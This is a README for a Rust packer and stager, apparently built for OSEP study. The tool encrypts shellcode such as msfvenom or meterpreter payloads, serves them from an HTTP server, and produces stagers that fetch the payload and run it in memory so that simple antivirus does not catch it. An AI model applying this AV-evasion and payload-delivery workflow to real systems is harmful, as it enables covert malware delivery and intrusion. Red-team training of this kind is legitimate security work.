# Tranquility

Tranquility is a custom stager and packer I wrote in Rust. It's mainly a side project I'm working on while I study for my OSEP certification. The tool is designed with payload encryption in mind, which means you can encrypt your payloads and store the keys on your own server.

## Disclaimer

This is just a pet project of mine, so please use it responsibly in your own test environments. I'm not responsible for any misuse or damage caused by this tool. Also, if you're testing it out, it'd be great if you could turn off AV sample submissions.

## Building Tranquility

building from source:
Building is simple. Just go to the root of the folder and run 'cargo build --release'. Executable is found in target/release.

## Packer Usage:
The packer is made to pack raw/shellcode. For example, you can use an msfvenom payload, with the raw format.
Running tranquility_packer.exe -h displays this menu:

USAGE:
    tranquility_packer.exe --source <source> --target <target>

FLAGS:
    -h, --help       Prints help information
    -V, --version    Prints version information

OPTIONS:
    -s, --source <source>    Source file to compress and encrypt
    -t, --target <target>    Target file for the encrypted output

It's pretty self explanatory. When you process a file, it will generate a random key and iv. the iv will be prepended to the encrypted file, and the key will be saved alongside your new file with ".key" appended to the end.
Just make sure you serve both your key file and encrypted payload into the same folder. You can go ahead and stick both these files on your http server.


## Stager Usage:
The stager is made to fetch the created payload and execute it in mememory based on the settings you give it.
First, build the stager as outlined in the top of this readme. Next, navigate to the release folder, and you can generate modified stagers with command line arguments.
Running tranquility_stager.exe -h displays this menu:

USAGE:
    tranquility_stager.exe --ip <ip> --port <port> --filename <filename>

OPTIONS:
    -f, --filename <filename>    Name of the L33t_Pay10ad
    -h, --help                   Print help information
    -i, --ip <ip>                IP address of the server
    -p, --port <port>            Port number of the server
    -V, --version                Print version information

Really simple. So just pass the name of your packed payload, the ip of your server, port, and run it. Your modified stager will be outputted to the target\release folder.

This makes it really nice for bypassing simple AV (such as what is found on the OSEP) while still using common and convenient payloads, such as meterpreter payloads made by venom.
